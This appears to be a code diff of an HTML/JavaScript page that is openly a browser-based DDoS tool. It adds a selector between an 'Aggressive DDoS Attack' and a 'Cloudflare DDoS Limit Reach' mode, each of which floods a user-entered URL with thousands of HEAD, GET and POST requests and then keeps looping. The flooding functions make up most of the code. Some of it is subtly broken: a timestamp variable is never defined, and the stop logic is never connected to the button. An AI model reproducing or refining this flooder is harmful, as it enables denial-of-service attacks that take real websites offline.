@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aggressive DDoS Attack</title>
+    <title>Select DDoS Attack Tool</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -16,7 +16,7 @@
             font-size: 2.5em;
             margin-bottom: 20px;
         }
-        input[type="text"], button {
+        input[type="radio"], button {
             padding: 10px;
             margin: 5px;
             font-size: 1em;
@@ -24,9 +24,10 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        input[type="text"] {
-            width: 100%;
-            max-width: 400px;
+        input[type="radio"] {
+            width: auto;
+            height: auto;
+            margin-right: 10px;
         }
         button {
             background: #61dafb;
@@ -52,38 +53,70 @@
     </style>
 </head>
 <body>
-    <h1>Aggressive DDoS Attack</h1>
-    <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
-    <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
+    <h1>Select DDoS Attack Tool</h1>
+    <p>
+        <input type="radio" id="tool1" name="ddosTool" value="aggressive" checked>
+        <label for="tool1">Aggressive DDoS Attack</label>
+    </p>
+    <p>
+        <input type="radio" id="tool2" name="ddosTool" value="cloudflare">
+        <label for="tool2">Cloudflare DDoS Limit Reach</label>
+    </p>
+    <button id="startButton" onclick="startSelectedAttack()">Start Attack</button>
     <div id="status"></div>
     <div id="console"></div>
 
     <script>
-        let attackInterval;
-        let isAttacking = false;
+        function startSelectedAttack() {
+            const selectedTool = document.querySelector('input[name="ddosTool"]:checked').value;
+            const statusDiv = document.getElementById('status');
+            const consoleDiv = document.getElementById('console');
 
-        function toggleAttack() {
-            const attackButton = document.getElementById('attackButton');
-            const targetURL = document.getElementById('targetURL').value;
-            if (!targetURL) {
-                document.getElementById('status').innerText = 'Please enter a valid target URL.';
-                return;
-            }
+            if (selectedTool === 'aggressive') {
+                // Clear previous outputs
+                statusDiv.innerText = '';
+                consoleDiv.innerHTML = '<script>let now = new Date().toLocaleString();</script>';
+                consoleOutput(`Starting Aggressive DDoS Attack at ${now}`);
 
-            if (!isAttacking) {
-                document.getElementById('status').innerText = 'Attack in progress...';
-                attackButton.innerText = 'Stop Attack';
-                isAttacking = true;
-                startAttack(targetURL);
-            } else {
-                document.getElementById('status').innerText = 'Attack stopped.';
-                attackButton.innerText = 'Start Attack';
-                isAttacking = false;
-                stopAttack();
+                // Initialize and start the aggressive DDoS attack
+                startAggressiveAttack();
+            } else if (selectedTool === 'cloudflare') {
+                // Clear previous outputs
+                statusDiv.innerText = '';
+                consoleDiv.innerHTML = '<script>let now = new Date().toLocaleString();</script>';
+                consoleOutput(`Starting Cloudflare DDoS Limit Reach at ${now}`);
+
+                // Initialize and start the Cloudflare DDoS attack
+                startCloudflareAttack();
             }
         }
 
-        function startAttack(targetURL) {
+        function startAggressiveAttack() {
+            const targetURL = prompt("Enter the target URL for the Aggressive DDoS Attack:");
+            if (targetURL) {
+                const attackButton = document.getElementById('startButton');
+                attackButton.innerText = 'Stop Attack';
+                isAttacking = true;
+                document.getElementById('status').innerText = 'Attack in progress...';
+                startAttackAggressive(targetURL);
+            }
+        }
+
+        function startCloudflareAttack() {
+            const targetURL = prompt("Enter the target URL for the Cloudflare DDoS Limit Reach:");
+            if (targetURL) {
+                const attackButton = document.getElementById('startButton');
+                attackButton.innerText = 'Stop Attack';
+                isAttacking = true;
+                document.getElementById('status').innerText = 'Attack in progress...';
+                startAttackCloudflare(targetURL);
+            }
+        }
+
+        let isAttacking = false;
+        let attackInterval;
+
+        function startAttackAggressive(targetURL) {
             function sendRequest(method, path) {
                 const xhr = new XMLHttpRequest();
                 xhr.open(method, targetURL + path, true);
@@ -95,7 +128,6 @@
                 xhr.send();
             }
 
-            // Initial burst of 2000 requests for each method and path
             const methods = ['HEAD', 'GET', 'POST'];
             const paths = ['/', '/index.html', '/api', '/randompath'];
             for (let i = 0; i < 2000; i++) {
@@ -104,7 +136,6 @@
                 });
             }
 
-            // Aggressive looping for each method and path
             attackInterval = setInterval(() => {
                 methods.forEach(method => {
                     paths.forEach(path => sendRequest(method, path));
@@ -112,10 +143,37 @@
             }, 0);
         }
 
+        function startAttackCloudflare(targetURL) {
+            function sendRequest(method) {
+                const xhr = new XMLHttpRequest();
+                xhr.open(method, targetURL, true);
+                xhr.withCredentials = true;
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
+                    }
+                };
+                xhr.send();
+            }
+
+            const methods = ['HEAD', 'GET', 'POST'];
+            for (let i = 0; i < 2000; i++) {
+                methods.forEach(method => sendRequest(method));
+            }
+
+            attackInterval = setInterval(() => {
+                methods.forEach(method => sendRequest(method));
+            }, 100);
+        }
+
         function stopAttack() {
             if (attackInterval) {
                 clearInterval(attackInterval);
             }
+            isAttacking = false;
+            const attackButton = document.getElementById('startButton');
+            attackButton.innerText = 'Start Attack';
+            document.getElementById('status').innerText = 'Attack stopped.';
         }
 
         function consoleOutput(message) {
